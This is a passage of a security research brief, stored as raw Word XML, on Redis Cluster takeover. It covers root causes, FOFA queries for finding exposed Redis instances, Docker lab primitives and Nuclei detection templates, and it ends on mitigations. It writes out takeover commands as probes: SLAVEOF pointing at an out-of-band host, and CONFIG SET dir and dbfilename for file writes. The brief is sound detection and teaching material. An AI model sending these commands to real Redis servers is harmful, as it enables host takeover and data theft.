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Cluster Takeover – Research Brief</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>Issue Name: Redis Cluster Takeover</w:t>
        <w:br/>
        <w:t>Language: Go</w:t>
        <w:br/>
        <w:t>CVE Impact: Critical</w:t>
        <w:br/>
        <w:t>Test Method: FOFA / Docker</w:t>
        <w:br/>
        <w:t>Notes: Cluster protocol abuse</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Overview:</w:t>
        <w:br/>
        <w:t>Redis Cluster takeover refers to a class of attacks where an attacker abuses Redis cluster management and replication features to gain control over nodes, redirect replication, inject malicious configuration, or achieve remote code execution (RCE). These attacks commonly succeed when Redis instances are internet-exposed, unauthenticated, or misconfigured.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Root Causes:</w:t>
        <w:br/>
        <w:t>- No authentication enabled</w:t>
        <w:br/>
        <w:t>- Exposed Redis cluster bus ports</w:t>
        <w:br/>
        <w:t>- Abuse of SLAVEOF / REPLICAOF commands</w:t>
        <w:br/>
        <w:t>- CONFIG command misuse for file write</w:t>
        <w:br/>
        <w:t>- Malicious Redis module loading</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Testing &amp; Detection (FOFA / Docker):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>FOFA Recon:</w:t>
        <w:br/>
        <w:t>FOFA is used to identify exposed Redis clusters and unauthenticated Redis services.</w:t>
        <w:br/>
        <w:t>Common queries include:</w:t>
        <w:br/>
        <w:t>- app="Redis"</w:t>
        <w:br/>
        <w:t>- protocol="redis"</w:t>
        <w:br/>
        <w:t>- port=6379</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Docker-Based Lab Testing:</w:t>
        <w:br/>
        <w:t>Docker is used to simulate Redis clusters and validate takeover primitives such as:</w:t>
        <w:br/>
        <w:t>- CLUSTER NODES</w:t>
        <w:br/>
        <w:t>- SLAVEOF / REPLICAOF</w:t>
        <w:br/>
        <w:t>- CONFIG SET dir</w:t>
        <w:br/>
        <w:t>- CONFIG SET dbfilename</w:t>
        <w:br/>
        <w:t>- SAVE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Notable Major Problems &amp; Real-World Impact:</w:t>
        <w:br/>
        <w:t>- Full host compromise</w:t>
        <w:br/>
        <w:t>- Malware deployment via Redis</w:t>
        <w:br/>
        <w:t>- Data exfiltration</w:t>
        <w:br/>
        <w:t>- Lateral movement in internal networks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Nuclei Templates (Main Focus):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Template Coverage:</w:t>
        <w:br/>
        <w:t>Nuclei includes Redis-related templates focused on:</w:t>
        <w:br/>
        <w:t>- Unauthenticated Redis access</w:t>
        <w:br/>
        <w:t>- Redis INFO exposure</w:t>
        <w:br/>
        <w:t>- Replication abuse detection</w:t>
        <w:br/>
        <w:t>- CONFIG command abuse</w:t>
        <w:br/>
        <w:t>- Redis RCE detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Typical YAML Logic Patterns:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Network Service Detection:</w:t>
        <w:br/>
        <w:t>network:</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - host: "{{Hostname}}"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    port: 6379</w:t>
        <w:br/>
        <w:t xml:space="preserve">    inputs:</w:t>
        <w:br/>
        <w:t xml:space="preserve">      - data: "INFO\r\n"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Matchers:</w:t>
        <w:br/>
        <w:t>- Match on "redis_version" in response to confirm unauthenticated access</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Replication Abuse Testing:</w:t>
        <w:br/>
        <w:t>- data: "SLAVEOF {{interactsh-url}} 6379\r\n"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>CONFIG Abuse Checks:</w:t>
        <w:br/>
        <w:t>- data: "CONFIG SET dir /tmp\r\n"</w:t>
        <w:br/>
        <w:t>- data: "CONFIG SET dbfilename test.rdb\r\n"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>How YAML Logic Tackles Takeover:</w:t>
        <w:br/>
        <w:t>Nuclei templates typically:</w:t>
        <w:br/>
        <w:t>1. Detect open Redis</w:t>
        <w:br/>
        <w:t>2. Confirm unauthenticated access</w:t>
        <w:br/>
        <w:t>3. Probe replication primitives</w:t>
        <w:br/>
        <w:t>4. Probe CONFIG/file write primitives</w:t>
        <w:br/>
        <w:t>5. Flag high-risk takeover conditions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Mitigations:</w:t>
        <w:br/>
        <w:t>- Enable authentication and ACLs</w:t>
        <w:br/>
        <w:t>- Restrict network exposure</w:t>
        <w:br/>
        <w:t>- Block dangerous commands</w:t>
        <w:br/>
        <w:t>- Monitor for unauthorized replication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